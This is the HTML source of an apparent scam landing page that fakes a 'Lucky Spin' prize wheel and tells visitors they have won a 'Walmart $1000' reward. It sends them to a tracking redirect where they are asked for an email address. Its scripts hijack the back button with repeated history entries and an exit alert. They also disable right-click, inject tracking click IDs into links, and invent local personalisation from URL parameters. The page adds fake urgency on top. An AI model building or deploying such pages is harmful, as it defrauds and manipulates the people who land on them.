<!DOCTYPE html><!-- RDL Script --><!-- Function of the browser's back button --><html webdriver="true"><head>
  <base href="">
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="referrer" content="no-referrer">
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
        <title>Congratulations!</title>
        <link rel="stylesheet" type="text/css" href="sweetalert.css">
        <script type="text/javascript" async="" src="6a844c1c.js.1"></script><script type="text/javascript" async="" src="pta_en.txt"></script><script>
            function getURLParameter(name) {
                return decodeURI(
                    (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
                );
            }
            var model = getURLParameter('model');
            var brand = getURLParameter('brand');
            var city = getURLParameter('city');
            var browser = getURLParameter('browser');
            var citylow = city.toLowerCase();
            var brandlow = brand.toLocaleLowerCase();
            var modellow = model.toLocaleLowerCase();
            var browserlow = browser.toLocaleLowerCase();
            var ep = getURLParameter('ep');
            var version = +getURLParameter('v');
            var tracker = +getURLParameter('tracker');
            var redirectURL = getURLParameter('tb');
            var page = getURLParameter('page');
            var http = redirectURL[0] + redirectURL[1] + redirectURL[2] + redirectURL[3];
            if(citylow == "unknown") { city = "your city"; }
            if(brandlow == "unknown") { brand = "phone"; }
            if(modellow == "unknown") { model = ""; }
            if(browserlow == "unknown") { browser = ""; }
        </script> 
    <style>#header {
	background-color: #3b5998;
	color: #fff;
	height: 40px;
	max-height: 40px;
	width: 100%;
	overflow: hidden;
	text-align: center;
}
#header h3 {
	display: inline-block;
	font-size: 1.1em;
	line-height: 40px;
	padding-left: 37px;
}
.icon {
	background-image: url(1.png);
	background-size: contain;
	display: inline-block;
	width: 27px;
	height: 25px;
	float: right;
	margin-top: 7px;
	margin-right: 10px;
}
</style>
<style>* {
    margin: 0;
}

body {
    background: #d3d6db;
    margin: 0;
    padding: 0;
    font-family: Arial, Helvetica, sans-serif;
    font-size: small
}

#container {
    padding: 6px
}

#firstpage {
    background-color: #fff;
    border-radius: 3px;
    margin-bottom: 5px;
    padding: 5px 10px
}

#subheadline {
    font-weight: 400;
    text-align: center;
    line-height: 15px
}

.date {
    font-size: .85em;
    color: #9c9c9c;
    margin: 2px 0
}

#topDate {
    text-align: center;
    width: 100%
}

.intro {
    margin-bottom: 5px
}

#wheelCon {
    position: relative;
    background-size: contain;
    background-position: center;
    background-repeat: no-repeat;
    background-color: #fff;
    border-radius: 3px;
    overflow: hidden
}

#wheel {
    z-index: 1;
    width: 100%;
    height: auto;
    margin-top: 5px
}

#pressButton {
    position: absolute;
    background-image: url(spin_prize2.png);
    background-size: contain;
    cursor: pointer;
    width: 25%;
    height: 0;
    padding-top: 30.5%;
    z-index: 2;
    margin-left: auto;
    margin-right: auto;
    left: 0;
    right: 0;
    top: 110px;
    border: none;
    background-color: transparent;
}

#pressButton:disabled{
    opacity: 1;
}

#devMockup {
    position: absolute;
    max-width: 200px;
    max-height: 270px;
    height: auto;
    z-index: 3;
    display: none
}

.animated {
    -webkit-animation-duration: 1s;
    animation-duration: 1s;
    -webkit-animation-fill-mode: both;
    animation-fill-mode: both
}

@-webkit-keyframes rotateIn {
    0% {
        -webkit-transform-origin: center;
        transform-origin: center;
        -webkit-transform: rotate3d(0, 0, 1, -200deg);
        transform: rotate3d(0, 0, 1, -200deg);
        opacity: 0
    }
    100% {
        -webkit-transform-origin: center;
        transform-origin: center;
        -webkit-transform: none;
        transform: none;
        opacity: 1
    }
}

@keyframes rotateIn {
    0% {
        -webkit-transform-origin: center;
        transform-origin: center;
        -webkit-transform: rotate3d(0, 0, 1, -200deg);
        transform: rotate3d(0, 0, 1, -200deg);
        opacity: 0
    }
    100% {
        -webkit-transform-origin: center;
        transform-origin: center;
        -webkit-transform: none;
        transform: none;
        opacity: 1
    }
}

.rotateIn {
    -webkit-animation-name: rotateIn;
    animation-name: rotateIn
}

@media(min-width:614px) {
    #wheel {
        width: 32vw;
        left: 47vw;
        top: 27vw
    }
    #pressButton {
        width: 6%;
        top: 38%!important;
        background-repeat: no-repeat
    }
}

body {
    background: #d3d6db;
    margin: 0;
    padding: 0;
    font-family: helvetica, arial, sans-serif;
    font-size: small
}

 :focus {
    outline: 0
}


/* spin */

.spinAround {
    -webkit-animation: spin 6.6s;
    animation-timing-function: ease;
    animation-iteration-count: 1;
    animation-direction: normal;
    -webkit-animation-fill-mode: forwards;
    -moz-animation-fill-mode: forwards;
    -o-animation-fill-mode: forwards;
    -ms-animation-fill-mode: forwards;
    animation-fill-mode: forwards
}

@-webkit-keyframes spin {
    0% {
        -webkit-transform: rotate(0);
        -ms-transform: rotate(0);
        transform: rotate(0)
    }
    90% {
        -webkit-transform: rotate(3110deg);
        -ms-transform: rotate(3110deg);
        transform: rotate(3110deg)
    }
    95% {
        -webkit-transform: rotate(3108deg);
        -ms-transform: rotate(3108deg);
        transform: rotate(3108deg)
    }
    100% {
        -webkit-transform: rotate(3109deg);
        -ms-transform: rotate(3109deg);
        transform: rotate(3109deg)
    }
}

.spinAround2 {
    -webkit-animation: spin2 6.6s;
    animation-timing-function: ease;
    animation-iteration-count: 1;
    animation-direction: normal;
    -webkit-animation-fill-mode: forwards;
    -moz-animation-fill-mode: forwards;
    -o-animation-fill-mode: forwards;
    -ms-animation-fill-mode: forwards;
    animation-fill-mode: forwards
}

@-webkit-keyframes spin2 {
    0% {
        -webkit-transform: rotate(3109deg);
        -ms-transform: rotate(3109deg);
        transform: rotate(3109deg)
    }
    90% {
        -webkit-transform: rotate(6314deg);
        -ms-transform: rotate(6314deg);
        transform: rotate(6314deg)
    }
    95% {
        -webkit-transform: rotate(6312deg);
        -ms-transform: rotate(6312deg);
        transform: rotate(6312deg)
    }
    100% {
        -webkit-transform: rotate(6313deg);
        -ms-transform: rotate(6313deg);
        transform: rotate(6313deg)
    }
}

.animated {
    -webkit-animation-duration: 1s;
    animation-duration: 1s;
    -webkit-animation-fill-mode: both;
    animation-fill-mode: both
}

@-webkit-keyframes rotateIn {
    0% {
        -webkit-transform-origin: center;
        transform-origin: center;
        -webkit-transform: rotate3d(0, 0, 1, -200deg);
        transform: rotate3d(0, 0, 1, -200deg);
        opacity: 0
    }
    100% {
        -webkit-transform-origin: center;
        transform-origin: center;
        -webkit-transform: none;
        transform: none;
        opacity: 1
    }
}

@keyframes rotateIn {
    0% {
        -webkit-transform-origin: center;
        transform-origin: center;
        -webkit-transform: rotate3d(0, 0, 1, -200deg);
        transform: rotate3d(0, 0, 1, -200deg);
        opacity: 0
    }
    100% {
        -webkit-transform-origin: center;
        transform-origin: center;
        -webkit-transform: none;
        transform: none;
        opacity: 1
    }
}

.rotateIn {
    -webkit-animation-name: rotateIn;
    animation-name: rotateIn
}</style>
<style>*{margin:0;}body{background:#d3d6db;margin:0;padding:0;font-family:Arial,Helvetica,sans-serif;font-size:small}.button{-moz-box-shadow:inset 0 1px 0 0 #7a8eb9;-webkit-box-shadow:inset 0 1px 0 0 #7a8eb9;box-shadow:inset 0 1px 0 0 #7a8eb9;background:-webkit-gradient(linear,left top,left bottom,color-stop(.05,#637aad),color-stop(1,#5972a7));background:-moz-linear-gradient(top,#637aad 5%,#5972a7 100%);background:-webkit-linear-gradient(top,#637aad 5%,#5972a7 100%);background:-o-linear-gradient(top,#637aad 5%,#5972a7 100%);background:-ms-linear-gradient(top,#637aad 5%,#5972a7 100%);background:linear-gradient(to bottom,#637aad 5%,#5972a7 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#637aad',endColorstr='#5972a7',GradientType=0);background-color:#637aad;border:1px solid #314179;color:#fff;font-size:16px;font-weight:700;height:27px;line-height:27px;text-decoration:none;width:180px;display:block;margin-top:4px;text-align:center}.smallfont{font-size:12px}.name{color:#3c5a96;font-weight:700;font-size: 100%;}.congrats{background-color:#fff;text-align:center;line-height:1.5;border-radius:3px;margin-bottom:5px;padding:8px}.timer{background-color:#fff;line-height:1.5;border-radius:3px;margin-bottom:5px;padding:8px}.prize{background-color:#fff;margin-bottom:5px;border-radius:3px}#secondpage{display:none; padding: 0;}

        body {
            background: #d3d6db;
            margin: 0;
            padding: 0;
            font-family: helvetica, arial, sans-serif;
            font-size: small
        }
        .button {
            width: 170px;
            display: block;
            outline: 0 none;
            padding: 0 8px;
            margin-top: 8px;
            text-align: center;
            background-color: #3b5998;
            background-image: -moz-linear-gradient(center top, #0c98c5, #0c98c5);
            border: 0 solid #4ec8ef;
            text-shadow: 0 0 rgba(0, 0, 0, 0.1);
            border-radius: 1px 1px 1px 1px;
            cursor: default;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            height: 33px;
            line-height: 33px
        }
        #secondpage a.button {
            text-decoration: none;
            color: #fff;
        }
        :focus {
            outline: 0
        }
        td {
            background-color: transparent;
            -webkit-transition: all .3s ease-in;
            -moz-transition: all .3s ease-in;
            -ms-transition: all .3s ease-in;
            -o-transition: all .3s ease-in;
            transition: all .3s ease-in
        }
        /* spin */
        ol {
            list-style: decimal inside;
            padding-left: 0px;
            overflow-x: visible;
        }
        ol li{
            list-style-type: decimal;
        }
        @media screen and (min-width: 381px){
            .prize{
                font-size: 16px;
            }
        }
        @media screen and (min-width: 460px){
            .prize{
                font-size: 18px;
            }
        }
        @media screen and (max-width: 359px){
            .button{
                width: 150px!important;
            }
            .like-line-menu__item{
                float: left;
            }
        }
        .timer{
        	font-size: 12px;
        }
	#secondpage a {
	        text-decoration: none;
                color: inherit;
	}</style>
<style>        body {
            background: #d3d6db;
            margin: 0;
            padding: 0;
            font-family: helvetica, arial, sans-serif;
            font-size: small
        }
        .header {
            background: #3b5998;
            height: 45px;
            margin: 0;
            padding: 0
        }
        .item {
            color: #1f2430;
            margin-bottom: 3px;
            padding: 2px;
            background: #fff;
            font-size: small;
            border-radius: 3px
        }
        .item .track {
            font-weight: 700;
            font-size: small
        }
        .item .lightblue2 {
            color: #000;
            margin-top: 2px;
            font-size: 12px;
            font-weight: 700
        }
        .track a {
            color: #3b5998;
            text-decoration: none
        }
        .clear {
            clear: both
        }
        .item .img {
            float: left;
            border: 0 solid #666;
            padding: 1px
        }
        .contestwrap {
            margin-bottom: 5px
        }
        .toptext {
            background: #fff;
            min-height: 40px;
            color: #1e2330;
            font-size: 11px;
            padding: 8px;
            border-radius: 3px
        }
        .secondary {
            color: #1f2430;
            margin-top: 5px;
            margin-bottom: 5px
        }
        .secondary span.lightblue {
            color: #1f2430;
            font-weight: 700;
            padding-right: 5px
        }
        .container {
            padding: 0 8px 8px 8px;
        }
        .button {
            width: 170px;
            display: block;
            outline: 0 none;
            padding: 0 8px;
            margin-top: 8px;
            text-align: center;
            background-color: #3b5998;
            background-image: -moz-linear-gradient(center top, #0c98c5, #0c98c5);
            border: 0 solid #4ec8ef;
            text-shadow: 0 0 rgba(0, 0, 0, 0.1);
            border-radius: 1px 1px 1px 1px;
            cursor: default;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            height: 33px;
            line-height: 33px
        }
        .button a {
            color: #000;
            text-decoration: none;
            font-size: small;
            cursor: hand
        }
        a.button {
            text-decoration: none
        }
        .rating {
            font-size: 12px
        }
        .button1 {
            width: 180px;
            display: block;
            outline: 0 none;
            padding: 0 8px;
            margin-top: 8px;
            text-align: center;
            background-color: #9f9f9f;
            border: 0 solid #666;
            color: #fff;
            border-radius: 1px 1px 1px 1px;
            cursor: default;
            font-size: 20px;
            font-weight: 700;
            height: 33px;
            line-height: 33px
        }
        .button1 a {
            color: #ccc;
            text-decoration: none;
            font-size: small;
            cursor: hand
        }
        a.button1 {
            text-decoration: none
        }
        .red {
            color: #fff;
            font-weight: 700
        }
        .green {
            color: #3C6;
            font-weight: 700
        }
        .select {
            background: #fff;
            margin: 3px 0 5px;
            color: #1f2430;
            font-size: small;
            line-height: 18px;
            padding: 5px;
            border-radius: 3px
        }
        .yellow {
            color: #3b5998
        }
        .left {
            float: left;
            width: 100px;
            margin-right: 5px;
            text-align: center;
            min-height: 60px
        }
        .right {
            float: left;
            width: 65%
        }
        .comments {
            background: #f6f7f8;
            border-radius: 3px;
            margin: 0;
            padding: 0;
        }
        :focus {
            outline: 0
        }
        .like-line-menu {
            background-color: #F3F3F3;
            border: #dadde1 solid;
            border-width: 1px 0;
            margin-top: 0;
        }
        .like-line-menu__item {
            display: inline-block;
            padding: 0 8px;
            position: relative;
            width: 27%;
            text-align: center;
        }
        .action_like{
            cursor: pointer;
        }
        .icon_like::before, .icon_comment::before, .icon_share::before{
            content: '';
            display: inline-block;
            height: 32px;
            margin-bottom: 1px;
            margin-right: 4px;
            vertical-align: middle;
            width: 16px;
            background-image: url(sprite_fb.png);
            background-repeat: no-repeat;
            background-size: auto;
        }
        .icon_like::before{
            background-position: -136px -50px;
        }
        .icon_comment::before{
            background-position: -119px -50px;
        }
        .icon_share::before{
            background-position: -170px -50px;
        }
        .like-line-menu__item::before {
            border-left: 1px solid #d6d8db;
            bottom: 7px;
            content: '';
            left: 0;
            position: absolute;
            top: 7px
        }
        .like-line-menu__item:first-child::before {
            display: none
        }
        .like-line-menu__item,
        .like-line-menu__item a {
            font-size: 8px;
            line-height: 36px;
            color: #5e5e5e;
            text-decoration: none;
            font-weight: 700
        }
        .like-count-line {
            padding: 8px;
            font-size: 14px;
            line-height: 16px;
            border-bottom: 1px #dadde1 solid;
            color: #000;
            font-weight: bold;
        }
        .inner_like_count_line{
            display: inline-block;
        }
        .icons_likes {
            display: inline-block;
            line-height: 16px;
            vertical-align: middle;
            height: 17px;
        }
        ._1g05:first-child {
            margin-left: 0;
        }
        ._1g05 {
            border-radius: 10px;
            margin-left: -6px;
            padding-right: 2px;
            padding-top: 1px;
            display: inline-block;
            position: relative;
            background-color: #fff;
        }
        .icon_likes_img {
            background-image: url(sprite_fb.png);
            background-size: auto;
            background-repeat: no-repeat;
            display: inline-block;
            height: 16px;
            width: 16px;
        }
        .like_1{
            background-position: -136px -110px;
        }
        .like_2{
            background-position: -153px -110px;
        }
        .like_3{
            background-position: -238px -110px;
        }
        ._1g06 {
            display: inline;
            margin-left: 4px;
            vertical-align: middle;
        }
        .shares{
            padding: 8px;
            font-size: 14px;
            font-weight: normal;
            border: #dadde1 solid;
            border-width: 0 0 1px 0;
        }
        .send-comments {
            border-bottom: 1px #dadde1 solid;
            padding: 8px
        }
        .send-comments--input_wrapper {
            float: left;
            width: calc(100% - 65px);
        }
        .send-comments--input_inner {
            width: 100%;
            float: left;
        }
        .send-comments--input {
            width: 100%;
            resize: none;
            border: 1px solid #dcdee3;
            background: #FFF;
            box-shadow: inset 0 1px 1px 0 rgba(0, 0, 0, .07);
            padding: 8px;
            height: 40px;
            font-size: 14px;
            line-height: 20px;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box
        }
        .send-comments--input:focus {
            height: 72px
        }
        .send-comments--submit_wrapper {
            width: 55px;
            float: right;
            text-align: center;
        }
        .send-comments--submit {
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            height: 40px;
            border-width: 1px;
            border-style: solid;
            border-color: rgba(0, 0, 0, .10) rgba(0, 0, 0, .155) rgba(0, 0, 0, .29);
            background-color: #f6f7f9;
            -webkit-border-radius: 4px;
            border-radius: 4px;
            color: #bec2c9;
            font-size: 12px;
            line-height: 36px;
            font-family: sans-serif;
            font-weight: 700;
            -webkit-appearance: none;
            padding: 0 8px;
            margin-top: 0;
            background-image: linear-gradient(rgba(255, 255, 255, .9), rgba(255, 255, 255, 0));
            text-shadow: 0 1px 1px rgba(255, 255, 255, .75);
            position: relative;
            width: 100%;
        }
        .send-comments--submit--active {
            color: #FFF;
            background: #5B93FC;
            cursor: pointer
        }
        .comments__item__meta {
            font-size: 9px;
            line-height: 14px;
            margin-top: 6px
        }
        .comments__item__meta__item {
            display: inline-block;
            color: #9197A3;
            position: relative;
            margin-left: -3px;
        }
        .comments__item__meta__item:first-child::before {
            display: none
        }
        .comments__item__meta__item:last-child::after{
            display: none;
        }
        .comments__item__meta__item:first-child {
            padding-left: 0;
            margin-left: 0;
        }
        .comments__item__meta__item a {
            color: #8190b0;
            text-decoration: none
        }
        .comments__item__meta__item__like_count .ico {
            background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAMAAABhq6zVAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyhpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDY3IDc5LjE1Nzc0NywgMjAxNS8wMy8zMC0yMzo0MDo0MiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QThGMzkyOTU2NDAwMTFFNTgxNzBFMEVFNTgwQ0IxMDEiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QThGMzkyOTY2NDAwMTFFNTgxNzBFMEVFNTgwQ0IxMDEiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpGNkEzNjc1NDYzRkYxMUU1ODE3MEUwRUU1ODBDQjEwMSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpBOEYzOTI5NDY0MDAxMUU1ODE3MEUwRUU1ODBDQjEwMSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PjYIgWYAAAERUExURfX29/P09naNu/L0+IqexGiBtGmCtf38+77I3XqRvrbC2f39++Dl7ebq7/Hz9f7//36Uvn2Tv32TvpChxqOxz3iPvHSMuv///Pf4+NPb6v7+/Ovu9ent9G+IuHCJuOfq8LK+15Omyunt8sLN4XSLuc7W5puszqi40/X2+oufxbnE2+Po8Yyfxevu832SvXqPvujs8oqdxKGxz5qqzWF8sIuexXmRveHm7XmPvefr8e/y9+fr8MbP4f39/HKJudrg7YWaweru8/Dy9fn5+f7+/uHm7nySvr/J3ebq8N/k7fj4+WuEtvP094KWwHqOu36RvWyFtv/+/JWnyfX2+Pf4+fz8+/j5+f///fn6/Pb3+P///wJTdw0AAABadFJOU///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////ANHWim8AAACSSURBVHjaHIpFEsMwEMA2SZmZmZmZmTlge///kNbVSZoRMI6iDh0qY8Bdw9SrJlj/AeQSqHZnKAPDH5809k2ogXbs5IsJKsU9FRXWi2bPPUFaCl+T0Lp7RSdfo6Id6o3HSOKxdG0gk3saBoUYpVl/CG4rfXvvO+jKZssONGEMiNOz7fRWgM2JUVYiJEi28leAAQCqkiDx3lcLoQAAAABJRU5ErkJggg==) no-repeat;
            width: 12px;
            height: 12px;
            display: inline-block;
            margin-right: 4px;
            margin-top: 1px;
            vertical-align: top
        }
        .comments__item__meta__item::after{
            content: '\a0\b7\a0';
        }
        .message_active td {
            background-color: #fdf9df
        }
        .photo_avatar img{
            width: 40px;
        }
        td {
            background-color: transparent;
            -webkit-transition: all .3s ease-in;
            -moz-transition: all .3s ease-in;
            -ms-transition: all .3s ease-in;
            -o-transition: all .3s ease-in;
            transition: all .3s ease-in
        }
        hr {
            height: 0;
            font-size: 0;
            line-height: 0;
            border: none;
            background: none;
            border-bottom: 1px #dadde1 solid
        }
        .header a.item {
            float: left;
            display: block;
            background: none;
            width: 16.66666%;
            overflow: hidden;
            text-align: center;
            height: 45px;
            padding: 0px;
            margin: 0px;
        }
        .header a.item span {
            background-image: url('menusprite.png');
            background-position: center top;
            display: block;
            width: 60px;
            height: 45px;
            margin: 0px auto;
        }
        .header a.item:first-child {
            background-color: #243C6D;
        }
        .header a.item:nth-child(2) span {
            background-position: center 249px;
        }
        .header a.item:nth-child(3) span {
            background-position: center 199px;
        }
        .header a.item:nth-child(4) span {
            background-position: center 149px;
        }
        .header a.item:nth-child(5) span {
            background-position: center 99px;
        }
        .header a.item:nth-child(6) span {
            background-position: center 49px;
        }
        /* spin */

        .hide-all {
        overflow: hidden;
        }
        ol,
        ul {
            list-style: decimal inside;
            padding-left: 0px;
            overflow-x: visible;
        }
        ol li{
            list-style-type: decimal;
        }
        .clearfix:after {
            content: " ";
            display: block;
            height: 0;
            clear: both;
            overflow: hidden;
            visibility: hidden
        }
        .clearfix {
            display: block
        }
        .wrapper {
            background-color: #fff;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            padding: 7px;
            width: 96%;
            margin: 0 auto 14px;
            border: 1px solid #c4cde1;
            border-top: 0;
            max-width: 414px
        }
        .logo {
            display: block;
            margin: 4px auto;
        }
        .txt {
            padding: 5px 6px;
            line-height: 18px;
            text-align: center
        }
        .bottom {
            width: 92%;
            margin: 20px auto 0;
            border: 1px solid #ccc;
            background-color: #f2f2f2;
            padding: 5px;
            border-radius: 10px;
            -moz-border-radius: 10px;
            -webkit-border-radius: 10px
        }
        .now {
            text-align: center;
            padding-top: 5px
        }
        #countdown {
            font-weight: bold;
        }
        .rules {
            color: #1b316c;
            padding: 4px 5px;
            line-height: 22px
        }
        .cta {
            display: block;
            background-color: #39579a;
            padding: 10px 0;
            text-align: center;
            font-weight: 700;
            color: #fff;
            font-size: 1.6em;
            border-bottom: 1px solid #1b316c;
            margin: 7px 13px 5px;
            text-decoration: none
        }
        .show-all {
            display: none;
        }
        .now2 {
            padding-top: 10px;
            font-weight: bold;
        }
        .terms {
            text-align: center;
            font-size: 11px;
            color: #666;
            padding: 4px;
            display: block;
            text-align: center;
            margin-top: 4px;
            text-align: justify;
        }
        hr {
            margin: 0px 5px;
        }
        @media screen and (min-width: 381px){
            .prize{
                font-size: 16px;
            }
        }
        @media screen and (min-width: 460px){
            .prize{
                font-size: 18px;
            }
            .like-line-menu__item, .like-line-menu__item a{
                font-size: 8px;
            }
            .timer{
                font-size: 12px;
            }
            .comments__item__meta{
                font-size: 8px;
            }
            .spec-header span {
                font-size: 8px;
            }
        }
        .proof {
            background: url(sprite.jpg) no-repeat top left;
            width: 200px;
        }
        .proof.proof1 {
            background-position: 0 -80px;
            height: 266px
        }
        .proof.proof2 {
            background-position: 0 -346px;
            height: 150px
        }
        .fbimg{
            margin-top: 10px;
        }
        .fbimg img{
             max-width: 100%;
         }
         .send-comments--submit{
              font-size: 9px;
              box-sizing: border-box;
         }</style><script src="gcc91g1y3wqj.js"></script>
<script type="text/javascript">
            var exittraffic_splashalertmessage = "Are you sure you want to leave the page?\n\nThe offer is limited! If you close this window, your chance of getting a reward will be given to someone else!";
            var exittraffic_RedirectUrl = "http://clicksets.com/click.php?lp=1";
        
function exit_a1() {alert("We reserved your Walmart $1000!\n\nComplete the survey on the next page to get your reward!");PreventExitSplash=!0;return false;}</script>

<script type='text/javascript' src="http://clicksets.com/click.php?key=j1bxfiokv6gm5nyevadz&lp_type=pixel"></script><script type='text/javascript'>function getUclick(){var m=document.cookie.match(new RegExp('(?:^|; )'+'uclick'+'=([^;]*)'));var u=m?decodeURIComponent(m[1]):undefined;return u}function fxOfLnks(){var u=getUclick();if(typeof u=='undefined')return!1;var l=document.getElementsByTagName('a');for(var i=0;i<l.length;i++){var href=l[i].getAttribute('href');if(typeof href=="string"){if(href.indexOf('&event')!=-1||href.indexOf('?event')!=-1||href.indexOf('?lp=1')!=-1||href.indexOf('?lp=data_upd')!=-1||href.indexOf('?cnv_id=OPTIONAL')!=-1){l[i].href=href+'&uclick='+u}}}};document.addEventListener("DOMContentLoaded",fxOfLnks);</script>
</head>

    <body oncontextmenu="return!1" onload="setButtonHeight(), autospin1()">
        <script src="add.htm"></script>
        <script src="sweetalert.js"></script>
<script type="text/javascript">
             ! function () { 
             var t; 
             try { 
                 for (t = 0; 30 > t; ++t) history.pushState({}, "", "#"); 
                 onpopstate = function (t) { 
                     window.onbeforeunload = null; 
                     alert(exittraffic_splashalertmessage); 
                 } 
                 } catch (o) {} 
             }(); 
        </script>
        <script type="text/javascript">
            function speak(text) {
                var msg = new SpeechSynthesisUtterance();
                var voices = speechSynthesis.getVoices();
                msg.voice = voices[2];
                msg.voiceURI = 'native';
                msg.volume = 1;
                msg.rate = 1;
                msg.pitch = 1;
                msg.text = text;
                msg.lang = 'en-US';

                speechSynthesis.speak(msg);
            }
           speak('Congratulations')
        </script>
        <script src="jquery.js"></script>
        <script language="Javascript">
            function date(n,t){var e,r,u=this,o=["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday","January","February","March","April","May","June","July","August","September","October","November","December"],i=/\\?(.?)/gi,c=function(n,t){return r[n]?r[n]():t},a=function(n,t){for(n=String(n);n.length<t;)n="0"+n;return n};return r={d:function(){return a(r.j(),2)},D:function(){return r.l().slice(0,3)},j:function(){return e.getDate()},l:function(){return o[r.w()]},N:function(){return r.w()||7},S:function(){var n=r.j(),t=n%10;return 3>=t&&1==parseInt(n%100/10,10)&&(t=0),["st","nd","rd"][t-1]||"th"},w:function(){return e.getDay()},z:function(){var n=new Date(r.Y(),r.n()-1,r.j()),t=new Date(r.Y(),0,1);return Math.round((n-t)/864e5)},W:function(){var n=new Date(r.Y(),r.n()-1,r.j()-r.N()+3),t=new Date(n.getFullYear(),0,4);return a(1+Math.round((n-t)/864e5/7),2)},F:function(){return o[6+r.n()]},m:function(){return a(r.n(),2)},M:function(){return r.F().slice(0,3)},n:function(){return e.getMonth()+1},t:function(){return new Date(r.Y(),r.n(),0).getDate()},L:function(){var n=r.Y();return n%4===0&n%100!==0|n%400===0},o:function(){var n=r.n(),t=r.W(),e=r.Y();return e+(12===n&&9>t?1:1===n&&t>9?-1:0)},Y:function(){return e.getFullYear()},y:function(){return r.Y().toString().slice(-2)},a:function(){return e.getHours()>11?"pm":"am"},A:function(){return r.a().toUpperCase()},B:function(){var n=3600*e.getUTCHours(),t=60*e.getUTCMinutes(),r=e.getUTCSeconds();return a(Math.floor((n+t+r+3600)/86.4)%1e3,3)},g:function(){return r.G()%12||12},G:function(){return e.getHours()},h:function(){return a(r.g(),2)},H:function(){return a(r.G(),2)},i:function(){return a(e.getMinutes(),2)},s:function(){return a(e.getSeconds(),2)},u:function(){return a(1e3*e.getMilliseconds(),6)},e:function(){throw"Not supported (see source code of date() for timezone on how to add support)"},I:function(){var n=new Date(r.Y(),0),t=Date.UTC(r.Y(),0),e=new Date(r.Y(),6),u=Date.UTC(r.Y(),6);return n-t!==e-u?1:0},O:function(){var n=e.getTimezoneOffset(),t=Math.abs(n);return(n>0?"-":"+")+a(100*Math.floor(t/60)+t%60,4)},P:function(){var n=r.O();return n.substr(0,3)+":"+n.substr(3,2)},T:function(){return"UTC"},Z:function(){return 60*-e.getTimezoneOffset()},c:function(){return"Y-m-d\\TH:i:sP".replace(i,c)},r:function(){return"D, d M Y H:i:s O".replace(i,c)},U:function(){return e/1e3|0}},this.date=function(n,t){return u=this,e=void 0===t?new Date:new Date(t instanceof Date?t:1e3*t),n.replace(i,c)},this.date(n,t)}
        </script>

         <div id="header"><span id="headline"><h3>LUCKY SPIN</h3></span><span class="icon"></span></div> 
         <div id="container">
                     <div id="firstpage" align="center">
            <div style="margin-bottom:2px">
                <div id="subheadline"><b>Congratulations!</b>
                    <br>You’re today’s lucky visitor!</div>
                <div id="topDate" class="date">
                    <script language="Javascript">
                        document.write(date("l, d F, Y"));
                    </script>Sunday, 03 March, 2019
                </div>
            </div>
            <div class="intro">Every <span id="today">
                    <script language="Javascript">
                        var dayNames = new Array("Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday");
                        var monthNames = new Array("January","February","March","April","May","June","July","August","September","October","November","December");
                        var now = new Date();
                        document.write(dayNames[now.getDay()]);
                    </script>Sunday
                    </span> we select 7 lucky LG K330 visitors in <b>Fort Mill</b> to receive an exclusive reward from our sponsors. Spin the wheel to find out what reward you could get!</div>
            <div id="wheelCon"><img id="wheel" src="prizewheel_walmart1000.png" width="501" height="501" class="spinAround2 transparent">
                <input type="button" id="pressButton" onclick="spin()" style="top: 106.2px;">
                <div><img id="devMockup" class="animated rotateIn" src="walmart1000_002.png" style="display: block; left: 80px; top: 115px;"></div>
            </div>
        </div>
                     <div id="secondpage">
            <div class="congrats">
                <h4><a id="landingTarget1" href="http://clicksets.com/click.php?lp=1" onclick="PreventExitSplash = !0;" rel="noreferrer"><font color="#3c5a96">Congratulations! Walmart $1000 reserved for you!</font></a></h4>
            </div>
            <div class="congrats" style="text-align: left;">
                <ol>
                    <!-- <li>Choose your favorite color.</li>-->
                    <li>Press SELECT to claim your Walmart $1000. You will be redirected to our partner’s website.</li>
                    <li>Enter your email address to get information on how to receive your reward.</li>
                </ol>
                <b>IMPORTANT:</b> The products may disappear at any moment, so click fast.
            </div>
